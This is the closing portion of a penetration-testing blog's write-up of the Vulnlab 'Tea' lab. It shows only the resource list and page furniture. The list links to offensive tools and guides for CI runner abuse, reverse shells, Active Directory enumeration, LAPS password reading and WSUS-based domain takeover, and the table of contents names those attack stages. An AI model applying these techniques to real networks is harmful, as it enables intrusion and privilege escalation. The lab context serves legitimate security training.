<p>Big thanks to kozie for creating this chain.</p>
<h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><p><a target="_blank" rel="noopener" href="https://frichetten.com/blog/abusing-gitlab-runners/">https://frichetten.com/blog/abusing-gitlab-runners/</a><br><a target="_blank" rel="noopener" href="https://docs.gitea.com/usage/actions/quickstart">https://docs.gitea.com/usage/actions/quickstart</a><br><a target="_blank" rel="noopener" href="https://github.com/ChristopherHX/gitea-actions-runner/blob/main/.gitea/workflows/build_release.yml">https://github.com/ChristopherHX/gitea-actions-runner/blob/main/.gitea/workflows/build_release.yml</a><br><a target="_blank" rel="noopener" href="https://www.revshells.com/">https://www.revshells.com/</a><br><a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/SharpHound">https://github.com/BloodHoundAD/SharpHound</a><br><a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a><br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview">https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview</a><br><a target="_blank" rel="noopener" href="https://github.com/leoloobeek/LAPSToolkit">https://github.com/leoloobeek/LAPSToolkit</a><br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/get-started/windows-server-update-services-wsus">https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/get-started/windows-server-update-services-wsus</a><br><a target="_blank" rel="noopener" href="https://github.com/alex-dengx/WSUSpendu">https://github.com/alex-dengx/WSUSpendu</a><br><a target="_blank" rel="noopener" href="https://github.com/nettitude/SharpWSUS">https://github.com/nettitude/SharpWSUS</a><br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite</a></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Windows/">Windows</a><a class="post-meta__tags" href="/tags/Vulnlab/">Vulnlab</a><a class="post-meta__tags" href="/tags/Medium/">Medium</a></div><div class="post_share"><div class="social-share" data-image="/images/vulnlab/tea-vl/tea_slide.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/06/30/Driver-Hack-The-Box/" title="Driver - Hack The Box"><img class="cover" src="/images/hackthebox/Driver/driver.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">Driver - Hack The Box</div></div></a></div><div class="next-post pull-right"><a href="/2024/09/11/ewptx/" title="eWPTX Certification"><img class="cover" src="/images/certs/eWPTXv2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">eWPTX Certification</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2024/06/30/delegate/" title="Delegate - Vulnlab"><img class="cover" src="/images/vulnlab/delegate-vl/delegate_slide.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-30</div><div class="title">Delegate - Vulnlab</div></div></a></div><div><a href="/2024/06/05/trusted/" title="Trusted - Vulnlab"><img class="cover" src="/images/vulnlab/trusted-vl/trusted_slide.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-05</div><div class="title">Trusted - Vulnlab</div></div></a></div><div><a href="/2024/06/30/Driver-Hack-The-Box/" title="Driver - Hack The Box"><img class="cover" src="/images/hackthebox/Driver/driver.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-30</div><div class="title">Driver - Hack The Box</div></div></a></div><div><a href="/2024/06/30/driver/" title="Driver - Hack The Box"><img class="cover" src="/images/hackthebox/Driver/driver.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-30</div><div class="title">Driver - Hack The Box</div></div></a></div><div><a href="/2024/06/30/mailing/" title="Mailing - Hack The Box"><img class="cover" src="/images/hackthebox/Mailing/mailing.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-30</div><div class="title">Mailing - Hack The Box</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/cyber.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Youssef Achtatal</div><div class="author-info__description">Pentesting & Windows security research</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">8</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">10</div></a><a href="//"><div class="headline">Articles</div><div class="length-num">8</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/DaZ-CYBER" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/youssef-achtatal-5642a52b1/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://www.instagram.com/_danny_feli_/" target="_blank" title="Instagram"><i class="fab fa-instagram" style="color: #cd486b;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is a website where I post my writeups from Vulnlab & HTB, along with exploit research!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Initial-Enumeration"><span class="toc-text">Initial Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SRV-Web-Application-Enumeration"><span class="toc-text">SRV Web Application Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Foothold-with-CI-CD-Runner-Exploitation"><span class="toc-text">Foothold with CI&#x2F;CD Runner Exploitation</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Domain-Enumeration"><span class="toc-text">Domain Enumeration</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reading-LAPS-Passwords"><span class="toc-text">Reading LAPS Passwords</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Domain-Dominance-through-WSUS"><span class="toc-text">Domain Dominance through WSUS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/09/11/ewptx/" title="eWPTX Certification"><img src="/images/certs/eWPTXv2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="eWPTX Certification"/></a><div class="content"><a class="title" href="/2024/09/11/ewptx/" title="eWPTX Certification">eWPTX Certification</a><time datetime="2024-09-11T13:00:00.000Z" title="Created 2024-09-11 09:00:00">2024-09-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/26/tea/" title="Tea - Vulnlab"><img src="/images/vulnlab/tea-vl/tea_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tea - Vulnlab"/></a><div class="content"><a class="title" href="/2024/08/26/tea/" title="Tea - Vulnlab">Tea - Vulnlab</a><time datetime="2024-08-26T15:48:36.000Z" title="Created 2024-08-26 11:48:36">2024-08-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/30/Driver-Hack-The-Box/" title="Driver - Hack The Box"><img src="/images/hackthebox/Driver/driver.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Driver - Hack The Box"/></a><div class="content"><a class="title" href="/2024/06/30/Driver-Hack-The-Box/" title="Driver - Hack The Box">Driver - Hack The Box</a><time datetime="2024-06-30T17:16:36.000Z" title="Created 2024-06-30 13:16:36">2024-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/30/delegate/" title="Delegate - Vulnlab"><img src="/images/vulnlab/delegate-vl/delegate_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Delegate - Vulnlab"/></a><div class="content"><a class="title" href="/2024/06/30/delegate/" title="Delegate - Vulnlab">Delegate - Vulnlab</a><time datetime="2024-06-30T17:16:36.000Z" title="Created 2024-06-30 13:16:36">2024-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/30/driver/" title="Driver - Hack The Box"><img src="/images/hackthebox/Driver/driver.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Driver - Hack The Box"/></a><div class="content"><a class="title" href="/2024/06/30/driver/" title="Driver - Hack The Box">Driver - Hack The Box</a><time datetime="2024-06-30T17:16:36.000Z" title="Created 2024-06-30 13:16:36">2024-06-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Youssef Achtatal</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hello, welcome to my <a target="_blank" rel="noopener" href="https://butterfly.js.org/">website</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="getsystem,sudo rm -rf,root,administrator,havoc,sliver,cobalt strike,python,c#,daz,empire,( ͡° ͜ʖ ͡°)" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>